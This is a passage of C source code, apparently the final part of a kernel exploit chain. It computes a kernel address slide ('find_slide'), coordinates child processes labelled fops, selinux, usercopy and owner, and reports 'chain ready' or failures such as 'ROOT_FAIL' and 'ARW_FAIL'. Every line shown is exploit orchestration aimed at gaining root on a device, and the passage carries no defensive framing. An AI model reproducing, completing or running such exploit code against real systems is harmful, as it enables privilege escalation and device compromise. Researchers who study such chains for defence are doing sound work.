    if (!strncmp(line, "ARW_FAIL", 8) || !strncmp(line, "ROOT_FAIL", 9)) {
      printf("CHAIN_FAIL dirty processes held live\n");
      fflush(stdout);
      for (;;)
        pause();
    }
  }
  if (!ready) {
    printf("CHAIN_FAIL fops proof stream ended\n");
    fflush(stdout);
    for (;;)
      pause();
  }
  if (fclose(fops_log))
    die("fclose fops");
  terminate_child(fops_pid, "terminate fops");
  terminate_child(selinux_pid, "terminate selinux");
  terminate_child(write_pid, "terminate fops write");
  terminate_child(owner_pid, "terminate fops owner");
  terminate_child(patch_pid, "terminate usercopy");
  reap_all_children();
  printf("chain ready slide=%#llx detached=1\n", (unsigned long long)slide);
  fflush(stdout);
  _exit(0);
}

_Noreturn void a536_exploit(void) {
  uint64_t slide = find_slide();

  printf("auto slide=%#llx\n", (unsigned long long)slide);
  fflush(stdout);
  run_chain(slide);
}
